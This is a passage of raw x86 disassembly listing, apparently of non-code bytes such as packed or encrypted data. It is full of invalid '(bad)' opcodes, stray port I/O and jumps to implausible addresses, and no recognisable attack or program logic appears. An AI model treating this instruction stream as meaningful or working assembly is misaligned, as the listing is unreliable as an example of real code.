  40a1fb:	test   DWORD PTR [eax+ebp*8-0x4a],ebx
  40a1ff:	test   DWORD PTR [ebx+0x25],0xcf044247
  40a206:	adc    al,BYTE PTR [ebp+edx*2+0x789071e7]
  40a20d:	cld    
  40a20e:	adc    BYTE PTR [esp+ecx*8+0x3e15042a],al
  40a215:	push   ebp
  40a216:	push   0x42
  40a218:	les    ecx,FWORD PTR [eax-0x19b37819]
  40a21e:	clc    
  40a21f:	and    bl,BYTE PTR [edx+0x2a]
  40a222:	lea    esp,[ecx-0x5c]
  40a225:	adc    ebp,ebp
  40a227:	in     eax,dx
  40a228:	dec    ebx
  40a229:	loope  0x40a285
  40a22b:	bound  edx,QWORD PTR [ebx+0x2e1ed121]
  40a231:	dec    ebx
  40a232:	and    eax,DWORD PTR [ebp+eax*2-0x7136ed01]
  40a239:	icebp  
  40a23a:	mov    ds:0xe505b658,al
  40a23f:	test   ah,ah
  40a241:	push   eax
  40a242:	std    
  40a243:	jbe    0x40a23b
  40a245:	popa   
  40a246:	mov    eax,ds:0x462a61f4
  40a24b:	jmp    0xaa9bc4bf
  40a250:	fbstp  TBYTE PTR [eax+0x6f]
  40a253:	das    
  40a254:	add    al,0x51
  40a256:	imul   edx,DWORD PTR [ebp+0x3e],0xffffff9d
  40a25a:	(bad)  
  40a25b:	repz adc DWORD PTR [edi+0x51d03185],ebx
  40a262:	fadd   DWORD PTR [ebp+0x26123317]
  40a268:	shl    DWORD PTR [ecx+0x34b7986d],cl
  40a26e:	pop    edx
  40a26f:	mov    dl,0xf5
  40a271:	adc    eax,0x6cd0ad16
  40a276:	cmc    
  40a277:	test   BYTE PTR [esi-0x18],ah
  40a27a:	sahf   
  40a27b:	js     0x40a2bb
  40a27d:	pop    ecx
  40a27e:	xor    eax,0xd6c9326d
  40a283:	arpl   WORD PTR ds:0xd4e37ee7,ax
  40a289:	dec    esi
  40a28a:	aas    
  40a28b:	lea    esp,[esi-0x30126d7]
  40a291:	sub    bl,BYTE PTR [ebx-0x52]
  40a294:	sbb    DWORD PTR [ebx+0x26],eax
  40a297:	retf   
  40a298:	push   0xd6bbd7f1
  40a29d:	loop   0x40a2b5
  40a29f:	jl     0x40a260
  40a2a1:	sbb    al,0x20
  40a2a3:	das    
  40a2a4:	(bad)  
  40a2a5:	daa    
  40a2a6:	jb     0x40a276
  40a2a8:	pop    es
  40a2a9:	outs   dx,DWORD PTR ds:[esi]
  40a2aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2ab:	pushf  
  40a2ac:	mov    esi,0xce51864e
  40a2b1:	sub    DWORD PTR es:[ebp+0x6f],ebx
  40a2b5:	out    0x5a,eax
  40a2b7:	mov    ch,0x61
  40a2b9:	sbb    eax,0x11
  40a2bc:	inc    edi
  40a2bd:	mov    ebx,0x8bfcfef6
  40a2c2:	bound  ebx,QWORD PTR [esi+0x47d22ed1]
  40a2c8:	inc    ebx
  40a2c9:	xchg   ecx,eax
  40a2ca:	fidivr DWORD PTR [edi-0x50]
  40a2cd:	fs jp  0x40a253
  40a2d0:	sub    al,0xd
  40a2d2:	iret   
  40a2d3:	test   DWORD PTR [esi+esi*4],0xcb07a30a
  40a2da:	pop    ebx
  40a2db:	mov    ?,ebx
  40a2dd:	pop    ebx
  40a2de:	add    al,0x44
  40a2e0:	sub    al,0x72
  40a2e2:	mov    ds:0xec05be99,eax
  40a2e7:	outs   dx,DWORD PTR ds:[esi]
  40a2e8:	push   edi
  40a2e9:	push   0xffffffd2
  40a2eb:	ds mov ecx,0xb55a5ece
  40a2f1:	es inc esi
  40a2f3:	les    esi,FWORD PTR [eax]
  40a2f5:	adc    ebx,esi
  40a2f7:	push   ebp
  40a2f8:	fmul   QWORD PTR [ebp-0x57]
  40a2fb:	test   BYTE PTR [edx-0x296b7f6b],dl
  40a301:	sbb    edi,DWORD PTR [ebx+0x5ac5142c]
  40a307:	sbb    cl,BYTE PTR [esi+eax*4-0x1d118d67]
  40a30e:	jl     0x40a2ce
  40a310:	push   ds
  40a311:	mov    bh,0x9a
  40a313:	test   DWORD PTR [ecx-0x68e1766c],ebp
  40a319:	les    ebx,FWORD PTR [edx-0x5c]
  40a31c:	into   
  40a31d:	popf   
  40a31e:	xchg   edi,eax
  40a31f:	sub    DWORD PTR [edx-0xf5d6202],0xffffffa4
  40a326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a327:	test   BYTE PTR [ebx-0x49536053],ch
  40a32d:	and    eax,0x6193c5c
  40a332:	aas    
  40a333:	jg     0x40a2c8
  40a335:	push   cs
  40a336:	aaa    
  40a337:	push   ds
  40a338:	push   es
  40a339:	and    DWORD PTR [eax],esp
  40a33b:	test   DWORD PTR [ebp-0x75],esi
  40a33e:	xor    eax,0xc8644e2e
  40a343:	mov    ebx,0xc05b57dc
  40a348:	rol    DWORD PTR [eax-0x7f2161a2],0x73
  40a34f:	test   BYTE PTR [esi+0x1f70f6f],bl
  40a355:	rcr    DWORD PTR [edx],0x6a
  40a358:	mov    edi,0x31b0989c
  40a35d:	neg    DWORD PTR [ebp-0x2b82ef76]
  40a363:	clc    
  40a364:	jmp    0x40a33f
  40a366:	pop    ebx
  40a367:	sti    
  40a368:	std    
  40a369:	cmp    ebx,ebp
  40a36b:	mov    ds:0x945d79f2,eax
  40a370:	jmp    0x6d70394c
  40a375:	loopne 0x40a381
  40a377:	lods   al,BYTE PTR ds:[esi]
  40a378:	pop    edi
  40a379:	leave  
  40a37a:	add    al,0xb8
  40a37c:	push   ecx
  40a37d:	(bad)  
  40a37e:	sbb    DWORD PTR [eax+0x26],esi
  40a381:	add    DWORD PTR [esi-0x1f],edx
  40a384:	call   0x9e8b:0x41a85b82
  40a38b:	in     al,0x84
  40a38d:	fdivr  st(2),st
  40a38f:	repz enterw 0x4b55,0x64
  40a395:	mov    ah,0xe9
  40a397:	inc    esp
  40a398:	ds add eax,0x80056876
  40a39e:	stos   BYTE PTR es:[edi],al
  40a39f:	call   0x98358ad7
  40a3a4:	xchg   edx,eax
  40a3a5:	out    dx,eax
  40a3a6:	sbb    dl,BYTE PTR [edx-0x158bb24a]
  40a3ac:	jnp    0x40a330
  40a3ae:	pop    ebx
  40a3af:	jo     0x40a3ce
  40a3b1:	stc    
  40a3b2:	shr    BYTE PTR [eax-0x569121a],0xe9
  40a3b9:	cmp    ebx,DWORD PTR [ecx+0x2a]
  40a3bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3bd:	dec    edi
  40a3be:	inc    ebx
  40a3bf:	or     BYTE PTR [ebx-0xd],0x2e
  40a3c3:	add    eax,0x855add22
  40a3c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3c9:	pop    ebp
  40a3ca:	cmp    DWORD PTR [ecx-0x7d9bb516],esi
  40a3d0:	int    0x34
  40a3d2:	pop    es
  40a3d3:	dec    edx
  40a3d4:	leave  
  40a3d5:	sub    al,0xda
  40a3d7:	mov    eax,ds:0x685acf48
  40a3dc:	js     0x40a395
  40a3de:	sbb    DWORD PTR [ecx],esp
  40a3e0:	mov    ds:0xfc852040,al
  40a3e5:	mov    eax,0x293fb63f
  40a3ea:	cmp    eax,0x28dfd96a
  40a3ef:	jl     0x40a426
  40a3f1:	(bad)  
  40a3f2:	test   DWORD PTR [edi-0x436c15f6],esp
  40a3f8:	xchg   edi,eax
  40a3f9:	loopne 0x40a476
  40a3fb:	add    eax,0x7d16206c
  40a400:	loope  0x40a3f8
  40a402:	pop    ecx
  40a403:	jle    0x40a417
  40a405:	aad    0x99
  40a407:	xor    BYTE PTR [edi-0x21],dl
  40a40a:	mov    edx,0xa56da675
  40a40f:	retf   
  40a410:	and    dh,0xf9
  40a413:	xor    bh,ch
  40a415:	push   ebp
  40a416:	push   esp
  40a417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a418:	mov    ah,0xdb
  40a41a:	pop    ebx
  40a41b:	push   es
  40a41c:	iret   
  40a41d:	inc    edx
  40a41e:	out    0x84,al
  40a420:	sub    al,0xdd
  40a422:	test   edi,edi
  40a424:	mov    al,0x56
  40a426:	pop    ebx
  40a427:	push   esp
  40a428:	dec    edx
  40a429:	bound  esp,QWORD PTR [esi+0x7a]
  40a42c:	add    eax,0xc4165b8b
  40a431:	xor    al,BYTE PTR [ebx+ebx*4-0x1e]
  40a435:	mov    dl,0x5c
  40a437:	mov    al,BYTE PTR [edx+0x73d93a66]
  40a43d:	outs   dx,DWORD PTR ds:[esi]
  40a43e:	test   BYTE PTR [edi],bh
  40a440:	fist   WORD PTR [edi]
  40a442:	pop    ebx
  40a443:	scas   al,BYTE PTR es:[edi]
  40a444:	xchg   DWORD PTR [ebp+edx*8-0x66],ecx
  40a448:	jbe    0x40a478
  40a44a:	push   0xffffff9a
  40a44c:	(bad)  
  40a44d:	out    0x33,al
  40a44f:	pushf  
  40a450:	jb     0x40a4b8
  40a452:	aas    
  40a453:	loope  0x40a494
  40a455:	inc    edi
  40a456:	add    BYTE PTR [ebp-0x54],0xb7
  40a45a:	sar    DWORD PTR [esi],1
  40a45c:	cmp    eax,0x71cfcef9
  40a461:	sub    DWORD PTR [esi+0x5a1833b9],edi
  40a467:	xlat   BYTE PTR ds:[ebx]
  40a468:	lods   eax,DWORD PTR ds:[esi]
  40a46a:	push   ss
  40a46b:	push   esi
  40a46c:	lea    ebx,[edi-0x181aa135]
  40a472:	and    BYTE PTR [ecx],ch
  40a474:	popf   
  40a475:	push   edx
  40a476:	(bad)  
  40a477:	cmp    ah,bl
  40a479:	jae    0x40a46e
  40a47b:	and    BYTE PTR [esi+0x234e5acd],cl
  40a481:	sbb    BYTE PTR [edi],0xaf
  40a484:	jl     0x40a463
  40a486:	icebp  
  40a487:	xchg   DWORD PTR [edi],ebp
  40a489:	pop    es
  40a48a:	addr16 pop esp
  40a48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a48d:	adc    al,0xbb
  40a48f:	xor    al,0x3f
  40a491:	popa   
  40a492:	scas   al,BYTE PTR es:[edi]
  40a493:	mov    eax,0xcd80e00f
  40a498:	inc    edx
  40a499:	out    0x8,al
  40a49b:	ss test eax,0xcb9e76b3
  40a4a1:	out    dx,eax
  40a4a2:	xchg   ebx,eax
  40a4a3:	xor    edi,DWORD PTR [esi]
  40a4a5:	cmp    ebp,DWORD PTR [ebx+0x77e69db]
  40a4ab:	and    eax,0xbe64db2f
  40a4b0:	mov    bl,0xe6
  40a4b2:	cdq    
  40a4b3:	jecxz  0x40a47d
  40a4b5:	stos   DWORD PTR es:[edi],eax
  40a4b6:	pushf  
  40a4b7:	mov    al,0x3e
  40a4b9:	mov    ebp,0xd3dfb514
  40a4be:	xor    esp,DWORD PTR [ebx-0x6072c0bd]
  40a4c4:	pushf  
  40a4c5:	jbe    0x40a4cf
  40a4c7:	test   DWORD PTR [ebx],ebp
  40a4c9:	ja     0x1c837f9d
  40a4cf:	in     eax,0x8c
  40a4d1:	bound  ebx,QWORD PTR [edx+0x40]
  40a4d4:	mov    eax,0x40a6b321
  40a4d9:	push   ebx
  40a4da:	mov    edi,0x90ce2c84
  40a4df:	and    eax,0x4eafe53e
  40a4e4:	lahf   
  40a4e5:	jl     0x40a510
  40a4e7:	leave  
  40a4e8:	mov    bl,0xe6
  40a4ea:	sar    ch,1
  40a4ec:	scas   al,BYTE PTR es:[edi]
  40a4ed:	ret    
  40a4ee:	inc    esi
  40a4ef:	nop
  40a4f0:	mov    ?,WORD PTR [edi]
  40a4f2:	call   0xcb279a42
  40a4f7:	jb     0x40a54c
  40a4f9:	in     eax,0xe5
  40a4fb:	mov    edi,0x7c12e75d
  40a500:	add    eax,0xaeceee83
  40a505:	cmp    al,0x17
  40a507:	and    BYTE PTR [ecx],bh
  40a509:	clc    
  40a50a:	pop    eax
  40a50b:	xchg   esp,eax
  40a50c:	mov    dl,0x4a
  40a50e:	(bad)  
  40a50f:	sub    eax,0x8f92e6a7
  40a514:	ins    BYTE PTR es:[edi],dx
  40a515:	mov    bl,0xcc
  40a517:	inc    edx
  40a518:	mov    al,0x39
  40a51a:	outs   dx,BYTE PTR ds:[esi]
  40a51b:	push   edx
  40a51c:	out    0xb1,al
  40a51e:	pop    ss
  40a51f:	cs jae 0x40a4e6
  40a522:	pop    ebx
  40a523:	outs   dx,BYTE PTR ds:[esi]
  40a524:	(bad)  
  40a525:	loope  0x40a513
  40a527:	add    al,BYTE PTR [eax+0x6cb3c917]
  40a52d:	test   dl,bl
  40a52f:	jmp    0x40a502
  40a531:	mov    ch,0xf6
  40a533:	adc    eax,0x65a9a35
  40a538:	adc    dx,bp
  40a53b:	push   edx
  40a53c:	inc    esi
  40a53d:	inc    DWORD PTR [ebp-0x7b]
  40a540:	loop   0x40a59e
  40a542:	icebp  
  40a543:	sar    DWORD PTR [esi],0xdb
  40a546:	jg     0x40a53a
  40a548:	in     eax,dx
  40a549:	ret    
  40a54a:	cmp    DWORD PTR [edx],esi
  40a54c:	mov    ds:0x375bbee8,al
  40a551:	push   esi
  40a552:	fcmovnu st,st(2)
  40a554:	fxch   st(7)
  40a556:	sbb    ebp,eax
  40a558:	aas    
  40a559:	ja     0x40a513
  40a55b:	mov    ds,eax
  40a55d:	call   0xe70b398b
  40a562:	inc    esp
  40a563:	in     al,dx
  40a564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a565:	push   0x2d
  40a567:	call   0x7a13:0x950087df
  40a56e:	arpl   WORD PTR [esi-0x2da5e521],bx
  40a574:	xor    eax,0xb2048af8
  40a579:	(bad)  
  40a57a:	jmp    0x1b540074
  40a57f:	repz ds jmp 0x40a57f
  40a583:	pop    esi
  40a584:	or     al,0x67
  40a586:	(bad)  
  40a587:	dec    esp
  40a588:	cld    
  40a589:	out    0xcc,al
  40a58b:	adc    DWORD PTR [esi],eax
  40a58d:	jecxz  0x40a5a7
  40a58f:	pop    eax
  40a590:	ret    
  40a591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a592:	in     eax,0xaa
  40a594:	rcl    DWORD PTR [esi],cl
  40a596:	pop    ebx
  40a597:	in     al,0x5
  40a599:	adc    eax,0x2fe0154c
  40a59e:	sets   dh
  40a5a1:	sub    ah,bh
  40a5a3:	mov    cl,0x1d
  40a5a5:	rol    DWORD PTR [ecx+ebp*8-0x5484a8c1],0x95
  40a5ad:	lods   al,BYTE PTR ds:[esi]
  40a5ae:	adc    eax,0xcae7d4cc
  40a5b3:	sub    DWORD PTR [edx+0x1b],esp
  40a5b6:	(bad)  
  40a5b7:	rol    BYTE PTR [ecx],1
  40a5b9:	push   esp
  40a5ba:	int    0x1d
  40a5bc:	aas    
  40a5bd:	mov    DWORD PTR [ebp+0x417414d8],edi
  40a5c3:	jno    0x40a57e
  40a5c5:	out    0xc6,eax
  40a5c7:	or     al,0xaa
  40a5c9:	and    DWORD PTR ds:0xb8b6afa2,eax
  40a5cf:	pop    es
  40a5d0:	adc    esp,DWORD PTR [edi-0x44]
  40a5d3:	jp     0x40a612
  40a5d5:	or     ebp,DWORD PTR [ecx-0x65]
  40a5d8:	rcl    DWORD PTR ds:0xdb8f55e1,1
  40a5de:	stos   BYTE PTR es:[edi],al
  40a5df:	jne    0x40a592
  40a5e1:	addr16 jne 0x40a61d
  40a5e4:	stc    
  40a5e5:	inc    esp
  40a5e6:	and    DWORD PTR [edx+0x4871a305],eax
  40a5ec:	mov    esi,0xff560472
  40a5f1:	ja     0x40a5e1
  40a5f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5f4:	les    ecx,FWORD PTR [eax]
  40a5f6:	scas   al,BYTE PTR es:[edi]
  40a5f7:	test   BYTE PTR [ebp+0x3e56a79c],dl
  40a5fd:	lds    ebp,FWORD PTR [ebx]
  40a5ff:	mov    BYTE PTR [ebx],bh
  40a601:	cdq    
  40a602:	(bad)  
  40a603:	jno    0x40a658
  40a605:	or     ah,cl
  40a607:	jp     0x40a5f7
  40a609:	in     al,dx
  40a60a:	fadd   QWORD PTR [ebp+0x3d5556c2]
  40a610:	out    0x38,eax
  40a612:	mov    ebx,0x59d4e20c
  40a617:	mov    ah,BYTE PTR [edx+0x4c]
  40a61a:	popf   
  40a61b:	je     0x40a674
  40a61d:	out    0xc2,al
  40a61f:	lds    esi,FWORD PTR ds:0x73cac5c1
  40a625:	test   al,0x8a
  40a627:	je     0x40a5e3
  40a629:	out    dx,eax
  40a62a:	pop    ebx
  40a62b:	and    al,0xda
  40a62d:	sbb    DWORD PTR [edx-0x58],esi
  40a630:	mov    edx,ds
  40a632:	jbe    0x40a6a1
  40a634:	(bad)  
  40a635:	pop    bp
  40a637:	mov    BYTE PTR [ebx-0x58],0xf6
  40a63b:	bound  esp,QWORD PTR [ebx]
  40a63d:	jns    0x40a685
  40a63f:	scas   eax,DWORD PTR es:[edi]
  40a640:	aam    0x27
  40a642:	sti    
  40a643:	addr16 popf 
  40a645:	xor    cl,BYTE PTR [edi]
  40a647:	jge    0x40a61b
  40a649:	inc    ecx
  40a64a:	mov    ebx,0x35d7aea1
  40a64f:	test   bh,dl
  40a651:	loopne 0x40a630
  40a653:	dec    edx
  40a654:	dec    eax
  40a655:	(bad)  
  40a656:	pop    eax
  40a657:	les    ecx,FWORD PTR [edx+0x4798a246]
  40a65d:	out    0x9a,al
  40a65f:	fisub  WORD PTR [esi+0x26]
  40a662:	add    eax,0x93e6a221
  40a667:	in     al,0x44
  40a669:	fcom   DWORD PTR [esi+eiz*2-0x6f]
  40a66d:	retf   0x72e0
  40a670:	pop    ds
  40a671:	sbb    dl,0x91
  40a674:	imul   dx,cx,0xff84
  40a678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a679:	or     DWORD PTR [ecx-0x3f],0xe5ab7131
  40a680:	rep stos DWORD PTR es:[edi],eax
  40a682:	add    eax,0x9acbfded
  40a687:	inc    edx
  40a688:	mov    ds:0x2a84e901,al
  40a68d:	sti    
  40a68e:	js     0x40a6dc
  40a690:	mul    ah
  40a692:	cmp    BYTE PTR [ecx+edx*8],bh
  40a695:	mov    ebx,0xa3e4879e
  40a69a:	pop    edx
  40a69b:	sbb    ah,BYTE PTR [eax+0x1e]
  40a69e:	cld    
  40a69f:	ins    DWORD PTR es:[edi],dx
  40a6a0:	stos   BYTE PTR es:[edi],al
  40a6a1:	or     DWORD PTR [edx+eax*4],esi
  40a6a4:	pop    es
  40a6a5:	mov    al,0x31
  40a6a7:	push   es
  40a6a8:	ja     0x40a691
  40a6aa:	or     BYTE PTR ds:0xabd6e5ea,dl
  40a6b0:	mov    cl,0x23
  40a6b2:	das    
  40a6b3:	add    BYTE PTR [ecx+0x76],dl
  40a6b6:	and    eax,0x7aa33ef2
  40a6bb:	cwde   
  40a6bc:	or     ch,cl
  40a6be:	out    0x65,eax
  40a6c0:	pop    es
  40a6c1:	xchg   ch,al
  40a6c3:	test   al,0xa2
  40a6c5:	daa    
  40a6c6:	fnstenv [eax-0x16]
  40a6c9:	or     al,dl
  40a6cb:	xchg   BYTE PTR [ebx+0x22],al
  40a6ce:	cmp    DWORD PTR [esi+0x3d178d8f],ecx
  40a6d4:	adc    edx,edi
  40a6d6:	inc    ebp
  40a6d7:	pop    esi
  40a6d8:	mov    esi,0xa9fe4de8
  40a6dd:	xor    ecx,esi
  40a6df:	js     0x40a69b
  40a6e1:	jle    0x40a704
  40a6e3:	xchg   edx,eax
  40a6e4:	xor    edi,esi
  40a6e6:	std    
  40a6e7:	call   0x95b8602b
  40a6ec:	iret   
  40a6ed:	and    al,0xc5
  40a6ef:	adc    eax,0x6afae667
  40a6f4:	fcom   QWORD PTR [ecx+0x636ea0db]
  40a6fa:	gs popa 
  40a6fc:	and    ebp,edi
  40a6fe:	jnp    0x40a6d7
  40a700:	(bad)  
  40a701:	and    bl,BYTE PTR [edi+0x1b]
  40a704:	(bad)  
  40a705:	addr16 add al,0x5c
  40a708:	jmp    0xf8f245f4
  40a70d:	mov    al,ds:0x367d7b1c
  40a712:	dec    ebp
  40a713:	(bad)
  40a717:	neg    BYTE PTR [edx*1+0x1ba04a5d]
  40a71e:	cli    
  40a71f:	xchg   cl,ah
  40a721:	dec    edx
  40a722:	mov    ecx,0xad4f38d7
  40a727:	in     al,0xf5
  40a729:	(bad)  
  40a72a:	pop    ebx
  40a72b:	test   BYTE PTR [ecx-0xd],bl
  40a72e:	mov    ecx,edx
  40a730:	or     eax,0xdcb442e7
  40a735:	ja     0x40a747
  40a737:	dec    eax
  40a738:	les    esi,FWORD PTR [edx+0x6]
  40a73b:	clc    
  40a73c:	sbb    al,0xe7
  40a73e:	sub    eax,0xbb706f12
  40a743:	xor    eax,0x9572e72a
  40a748:	adc    BYTE PTR [edx],0x37
  40a74b:	xchg   edi,eax
  40a74c:	int3   
  40a74d:	js     0x40a772
  40a74f:	mov    ah,dl
  40a751:	jmp    0x1db:0x29a1f666
  40a758:	push   edi
  40a759:	out    0x96,eax
  40a75b:	scas   al,BYTE PTR es:[edi]
  40a75c:	mov    edi,0x43d6489
  40a761:	je     0x40a770
  40a763:	repnz pop esp
  40a765:	mov    bl,0x5a
  40a767:	push   ss
  40a768:	mov    eax,ds:0xfa369a63
  40a76d:	sub    BYTE PTR [ebp-0x7b],cl
  40a770:	fadd   QWORD PTR [eax]
  40a772:	inc    esi
  40a773:	aad    0x3e
  40a775:	int    0xcc
  40a777:	cdq    
  40a778:	out    dx,al
  40a779:	xlat   BYTE PTR ds:[ebx]
  40a77a:	scas   al,BYTE PTR es:[edi]
  40a77b:	pop    esi
  40a77c:	ins    BYTE PTR es:[edi],dx
  40a77d:	out    0xb0,al
  40a77f:	jbe    0xadbd5ede
  40a785:	push   edx
  40a786:	test   DWORD PTR [edi-0x45],eax
  40a789:	addr16 pop edx
  40a78b:	sub    dl,ch
  40a78d:	adc    BYTE PTR [eax+0x3e],ah
  40a790:	push   eax
  40a791:	add    eax,0xece48471
  40a796:	jecxz  0x40a7ed
  40a798:	aas    
  40a799:	inc    ebx
  40a79a:	test   DWORD PTR [ebx+0x1e],edi
  40a79d:	rcr    DWORD PTR [edi+0x45],1
  40a7a0:	add    al,0x56
  40a7a2:	clc    
  40a7a3:	enter  0xf3e,0x30
  40a7a7:	pop    ss
  40a7a8:	xchg   edi,eax
  40a7a9:	in     eax,dx
  40a7aa:	test   DWORD PTR [edx-0x700dec2],0xcf9623f1
  40a7b4:	repz (bad) 
  40a7b7:	adc    DWORD PTR [ecx-0x19],esp
  40a7ba:	cmp    eax,DWORD PTR [eax-0x50d506c3]
  40a7c0:	ds mov edi,0x22698b1d
  40a7c6:	xchg   DWORD PTR [esi+0xc8e5c2],ebx
  40a7cc:	mov    dl,0x70
  40a7ce:	fs push esi
  40a7d0:	dec    esi
  40a7d1:	pop    es
  40a7d2:	das    
  40a7d3:	stos   BYTE PTR es:[edi],al
  40a7d4:	cmp    eax,0xa048ce77
  40a7d9:	mov    eax,0x75dfcc17
  40a7de:	pop    ss
  40a7df:	jns    0x40a83f
  40a7e1:	into   
  40a7e2:	push   ecx
  40a7e3:	test   BYTE PTR [eax+0x3d60278f],dl
  40a7e9:	ja     0x40a773
  40a7eb:	(bad)  
  40a7ec:	mov    esp,0xf6c955ca
  40a7f1:	pusha  
  40a7f2:	jle    0x40a85d
  40a7f4:	jp     0x40a804
  40a7f6:	push   edi
  40a7f7:	sti    
  40a7f8:	in     eax,dx
  40a7f9:	jae    0x40a856
  40a7fb:	sub    eax,0xcb05bc1d
  40a800:	xchg   esi,eax
  40a801:	jg     0x40a853
  40a803:	xacquire xchg DWORD PTR ds:[ebx+0x47d6c63f],edi
  40a80b:	outs   dx,DWORD PTR ds:[esi]
  40a80c:	in     al,0x76
  40a80e:	daa    
  40a80f:	mov    edx,0x4e73122
  40a814:	fnstsw WORD PTR [ecx]
  40a816:	lods   eax,DWORD PTR ds:[esi]
  40a817:	push   ds
  40a818:	mov    ah,BYTE PTR [ebx+ebx*2+0x5469a406]
  40a81f:	loope  0x40a7c9
  40a821:	stos   DWORD PTR es:[edi],eax
  40a822:	js     0x40a7a8
  40a824:	pushf  
  40a825:	dec    esp
  40a826:	mov    edx,0x50433e5a
  40a82b:	imul   ecx,DWORD PTR [ebp+0x6d5e7768],0x52d9c8da
  40a835:	out    0x15,eax
  40a837:	push   es
  40a838:	xchg   esp,eax
  40a839:	mov    ebx,0xcd3e9298
  40a83e:	mov    eax,ds:0xab6869ab
  40a843:	sub    edx,esi
  40a845:	add    eax,0xfada67c2
  40a84a:	test   DWORD PTR [edi+0x22bbccb],eax
  40a850:	daa    
  40a851:	cld    
  40a852:	adc    eax,0x5ad0797c
  40a857:	mov    al,ds:0x38f30f38
  40a85c:	mov    eax,0xf6843851
  40a861:	cs cs jae 0x40a8a3
  40a865:	jae    0x40a7eb
  40a867:	ret    
  40a868:	jp     0x40a892
  40a86a:	mov    esi,0x229523f8
  40a86f:	add    bh,BYTE PTR [edi]
  40a871:	jbe    0x40a8d3
  40a873:	xchg   ecx,eax
  40a874:	add    ah,dl
  40a876:	(bad)  
  40a877:	scas   al,BYTE PTR es:[edi]
  40a878:	jl     0x40a88a
  40a87a:	add    DWORD PTR [esi],0xffffffc7
  40a87d:	inc    esp
  40a87e:	push   esp
  40a87f:	or     al,0x3c
  40a881:	jecxz  0x40a82e
  40a883:	jg     0x40a80b
  40a885:	sub    DWORD PTR ds:0x58415fab,edi
  40a88b:	pop    edx
  40a88c:	sar    DWORD PTR cs:[ecx+edi*4-0x7a63ab44],cl
  40a894:	test   eax,0xffe0862c
  40a899:	sub    edx,DWORD PTR [ebp+0x7c]
  40a89c:	stc    
  40a89d:	push   esi
  40a89e:	dec    ebp
  40a89f:	jno    0x40a8e6
  40a8a1:	mov    ?,WORD PTR [edi-0xc]
  40a8a4:	push   esp
  40a8a5:	in     al,dx
  40a8a6:	in     eax,dx
  40a8a7:	lea    ebp,[esi+eiz*2]
  40a8aa:	or     DWORD PTR [ebp+0x1b22fa27],0xf25adc8a
  40a8b4:	push   0xfe7f4014
  40a8b9:	cmc    
  40a8ba:	enter  0x748d,0x66
  40a8be:	in     eax,dx
  40a8bf:	in     eax,dx
  40a8c0:	mov    ds:0x3ca5baff,al
  40a8c5:	cmp    al,0x58
  40a8c7:	jp     0x40a84d
  40a8c9:	adc    BYTE PTR [esi-0x32],cl
  40a8cc:	mov    esi,0xce9bc209
  40a8d1:	ja     0x40a8b9
  40a8d3:	test   BYTE PTR [eax],dh
  40a8d5:	xchg   ecx,eax
  40a8d6:	sub    al,0x67
  40a8d8:	ds jae 0x40a8ba
  40a8db:	stc    
  40a8dc:	xchg   ebx,eax
  40a8dd:	or     DWORD PTR ds:0x4ce6e465,edx
  40a8e3:	pop    es
  40a8e4:	fnstcw WORD PTR [edx+edx*2]
  40a8e7:	fwait
  40a8e8:	je     0x40a883
  40a8ea:	ds int 0x43
  40a8ed:	out    0xc2,al
  40a8ef:	xor    al,0xd3
  40a8f1:	inc    ebx
  40a8f2:	ja     0x40a921
  40a8f4:	imul   esp,edi,0xa70b3bd0
  40a8fa:	shr    DWORD PTR [esi+0x6784083d],0xcb
  40a901:	jmp    0x2f14:0x5fb61e5a
  40a908:	xor    BYTE PTR [esi-0x4dad7b7a],ch
  40a90e:	pushf  
  40a90f:	(bad)  
  40a910:	and    BYTE PTR [ecx],bl
  40a912:	popa   
  40a913:	(bad)  
  40a914:	into   
  40a915:	sub    DWORD PTR ds:0xde7d9e10,edi
  40a91b:	dec    ecx
  40a91c:	and    al,0xe5
  40a91e:	pop    eax
  40a91f:	sub    al,0x2e
  40a921:	dec    edx
  40a922:	pop    es
  40a923:	jno    0x40a97f
  40a925:	push   ds
  40a926:	dec    edi
  40a927:	add    bl,bh
  40a929:	or     BYTE PTR [esi+edi*8+0x16],al
  40a92d:	pop    edi
  40a92e:	pop    edi
  40a92f:	jp     0x40a965
  40a931:	fs inc eax
  40a933:	cli    
  40a934:	aas    
  40a935:	adc    ch,BYTE PTR [ebp+0x60]
  40a938:	pop    edi
  40a939:	frstor ds:0x7c833fb3
  40a93f:	(bad)  
  40a940:	mov    ecx,0xaa8bda7a
  40a945:	out    0xfa,al
  40a947:	out    dx,al
  40a948:	or     BYTE PTR [edi-0x66],0xff
  40a94c:	xchg   esp,eax
  40a94d:	jns    0x40a956
  40a94f:	xor    BYTE PTR [ecx+ebx*2+0x55ae1c59],bl
  40a956:	and    DWORD PTR [ebp+0x341ae7e6],0xffffffb6
  40a95d:	test   DWORD PTR [ebp+0x6a],eax
  40a960:	fwait
  40a961:	lock dec eax
  40a963:	mov    ecx,0x3413dfc3
  40a968:	aam    0xbe
  40a96a:	pop    ebp
  40a96b:	xor    BYTE PTR [ebx],ch
  40a96d:	adc    al,0xdf
  40a96f:	and    eax,0xbb616ea6
  40a974:	xor    al,0xe7
  40a976:	scas   al,BYTE PTR es:[edi]
  40a977:	mov    eax,0xc966472f
  40a97c:	push   cs
  40a97d:	fstp   DWORD PTR [esi-0xe]
  40a980:	push   cs
  40a981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a982:	inc    ebp
  40a983:	jae    0x40a949
  40a985:	sub    BYTE PTR [ebp-0x79],ch
  40a988:	mov    esi,0x571fdc81
  40a98e:	nop
  40a98f:	gs xchg ebx,eax
  40a991:	in     eax,0x53
  40a993:	into   
  40a994:	mov    ebp,0x992b3ee4
  40a999:	push   esi
  40a99a:	jmp    0x40a93d
  40a99c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a99d:	out    0x12,al
  40a99f:	jge    0x40a97b
  40a9a1:	fadd   st,st(6)
  40a9a3:	mov    ds:0x97e4d739,al
  40a9a8:	xchg   BYTE PTR ds:0xcc51265b,ch
